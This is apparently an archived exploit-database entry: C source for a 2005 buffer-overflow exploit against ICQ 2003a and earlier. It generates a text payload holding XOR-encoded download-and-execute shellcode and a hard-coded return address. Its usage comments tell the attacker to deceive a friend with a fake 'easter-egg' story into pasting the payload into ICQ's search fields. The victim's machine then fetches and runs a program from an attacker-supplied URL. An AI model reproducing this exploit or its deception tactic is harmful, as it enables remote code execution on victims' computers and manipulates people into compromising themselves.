/*
*
* Mirabilis ICQ 2003a Buffer Overflow Download Shellcoded Exploit
* Bug discovered & exploit coded by ATmaCA
* Web: http://www.spyinstructors.com  && http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Credit to Kozan and delicon
*
*/

/*
* Usage:
*
* Execute exploit, it will create "bof.txt" in current directory.
* Open ICQ <= 2003a and click "Add" button
* "Add / Invite Users to Your Contact List" dialog will be opened
* Copy the content of "bof.txt" to "First name" and "Last name" fields.
* Press "find" button
*
* Now, icq will download and run your server which you specified in WebUrl field.
*
* This exploit requires social engineering skills to use it. For example you should
* tell your friend that you've found a easter-egg and if he wants to see it he has to
* type your vuln. string to first and last name fields in icq then press find button etc...
*

/*
*
* Affected versions:
* Mirabilis ICQ Pro 2003a and prior versions.
*
* Tested with :
* ICQ 2003a Build #3800 on Win XP Pro Sp2
* ICQ 2002a Build #3728 on Win XP Pro Sp2
*
*/


#include <stdio.h>
#include <string.h>
#include <windows.h>

char *Sifrele(char *pszName1)
{
       char *pszName = pszName1;
       int Xor = 0x1d;
       int Size = strlen(pszName);
       for(int i=0;i<Size;i++)
               pszName[i] = pszName[i]^Xor;
       return pszName;
}

void main(int argc, char *argv[])
{
       if (argc < 2)
       {
               printf("\n\n\tMirabilis ICQ 2003a Buffer Overflow Download Shellcoded Exploit\n");
               printf("\tBug discovered & exploit coded by ATmaCA\n");
               printf("\tWeb: http://www.spyinstructors.com  && http://www.atmacasoft.com\n");
               printf("\tE-Mail: atmaca@icqmail.com\n");
               printf("\tCredit to Kozan and delicon\n\n");

               printf("Usage:\n");
               printf(" icq_bof <WebUrl>\n");
               printf(" Example:icq_bof http://www.atmacasoft.com/small.exe\n");

               return;
       }

       /* Generic win32 http download shellcode
       xored with 0x1d by delikon (http://delikon.de/) */
       char shellcode[] = "\xEB"
       "\x10\x58\x31\xC9\x66\x81\xE9\x22\xFF\x80\x30\x1D\x40\xE2\xFA\xEB\x05\xE8\xEB\xFF"
       "\xFF\xFF\xF4\xD1\x1D\x1D\x1D\x42\xF5\x4B\x1D\x1D\x1D\x94\xDE\x4D\x75\x93\x53\x13"
       "\xF1\xF5\x7D\x1D\x1D\x1D\x2C\xD4\x7B\xA4\x72\x73\x4C\x75\x68\x6F\x71\x70\x49\xE2"
       "\xCD\x4D\x75\x2B\x07\x32\x6D\xF5\x5B\x1D\x1D\x1D\x2C\xD4\x4C\x4C\x90\x2A\x4B\x90"
       "\x6A\x15\x4B\x4C\xE2\xCD\x4E\x75\x85\xE3\x97\x13\xF5\x30\x1D\x1D\x1D\x4C\x4A\xE2"
       "\xCD\x2C\xD4\x54\xFF\xE3\x4E\x75\x63\xC5\xFF\x6E\xF5\x04\x1D\x1D\x1D\xE2\xCD\x48"
       "\x4B\x79\xBC\x2D\x1D\x1D\x1D\x96\x5D\x11\x96\x6D\x01\xB0\x96\x75\x15\x94\xF5\x43"
       "\x40\xDE\x4E\x48\x4B\x4A\x96\x71\x39\x05\x96\x58\x21\x96\x49\x18\x65\x1C\xF7\x96"
       "\x57\x05\x96\x47\x3D\x1C\xF6\xFE\x28\x54\x96\x29\x96\x1C\xF3\x2C\xE2\xE1\x2C\xDD"
       "\xB1\x25\xFD\x69\x1A\xDC\xD2\x10\x1C\xDA\xF6\xEF\x26\x61\x39\x09\x68\xFC\x96\x47"
       "\x39\x1C\xF6\x7B\x96\x11\x56\x96\x47\x01\x1C\xF6\x96\x19\x96\x1C\xF5\xF4\x1F\x1D"
       "\x1D\x1D\x2C\xDD\x94\xF7\x42\x43\x40\x46\xDE\xF5\x32\xE2\xE2\xE2\x70\x75\x75\x33"
       "\x78\x65\x78\x1D";

       FILE *file;

       char buf[485];
       char *web;
       short int weblength;
       char *pointer = NULL;
       char *newshellcode;

       web = argv[1];
       weblength = (short int)0xff22;
       pointer = strstr(shellcode,"\x22\xff");
       weblength -= strlen(web)+1;
       memcpy(pointer,&weblength,2);
       newshellcode = (char*)malloc(sizeof(shellcode)+strlen(web)+1);
       strcpy(newshellcode,shellcode);
       strcat(newshellcode,Sifrele(web));
       strcat(newshellcode,"\x1d");

       if( (file = fopen("bof.txt", "w+")) == NULL )
               return;

       memset(buf, 0x90, 480);

       //ret - icqate32.dll (5.3.4.3727) jmp esp addr - [Universal]
       *(DWORD *) &buf[34]  = 0x12025c5c;
       memcpy(buf+34+32,newshellcode,strlen(newshellcode));
       *(DWORD *) &buf[480]  = 0x00000000;

       fprintf(file, "%s", buf);
       fclose(file);

       printf("\r\nbof.txt has been generated!\r\n");

       return;
}

// milw0rm.com [2005-10-29]